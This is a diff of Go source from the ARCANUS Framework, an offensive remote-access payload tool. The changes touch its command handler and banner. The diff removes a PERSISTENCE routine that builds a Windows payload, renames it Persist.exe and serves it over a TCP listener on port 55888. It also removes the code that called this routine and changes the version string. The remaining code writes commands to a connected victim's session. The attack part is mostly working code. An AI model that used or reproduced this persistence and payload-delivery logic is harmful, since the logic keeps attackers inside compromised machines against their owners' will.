@@ -239,13 +239,7 @@ func main() {
         color.Red("\n[-] This payload type does not support \"REMOTE DESKTOP\" module !")
       }
     }else if strings.Contains(_Command, "£persistence") || strings.Contains(_Command, "£PERSISTENCE") {
-      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
-        GLOBAL__Command = string("£PERSISTENCE -F \"Persist.exe\" ")
-        PERSISTENCE()
-        connect.Write([]byte(GLOBAL__Command))
-      } else if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
-        color.Red("[-] This payload type does not support \"PERSISTENCE\" module !")
-      }
+    	connect.Write([]byte(GLOBAL__Command))
     }else if strings.Contains(_Command, "£help") || strings.Contains(_Command, "£HELP")  {
       if runtime.GOOS == "windows" {
         HELP_SCREEN_WIN()
@@ -293,18 +287,6 @@ func main() {
 
 
 
-func PERSISTENCE() {
-  if Payload.Type == "Windows" {
-    go GENERATE_WINDOWS_PAYLOAD()
-    exec.Command("cmd", "/C", "rename Payload.exe Persist.exe").Run()
-  }else if Payload.Type == "Stager_Windows" {
-    go GENERATE_WINDOWS_STAGER_PAYLOAD()
-    exec.Command("cmd", "/C", "rename Payload.exe Persist.exe").Run()
-  }
-  go UPLOAD_VIA_TCP()
-}
-
-
 func UPLOAD_VIA_TCP() {
   ln, _ := net.Listen("tcp", ":55888")
   connect, _ := ln.Accept()
@@ -350,7 +332,7 @@ func BANNER() {
     color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
     color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK               ]")
-    color.Green("+ -- --=[ Version: 1.0.9                          ]")
+    color.Green("+ -- --=[ Version: 1.0.8                          ]")
     color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
     color.Green("+ -- --=[          Created By Ege Balcı           ]")
   }else if runtime.GOOS == "linux" {
@@ -364,7 +346,7 @@ func BANNER() {
     color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")
 
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                 ]")
-    color.Green("+ -- --=[ Version: 1.0.9                          ]")
+    color.Green("+ -- --=[ Version: 1.0.8                          ]")
     color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
     color.Green("+ -- --=[          Created By Ege Balcı           ]")
 
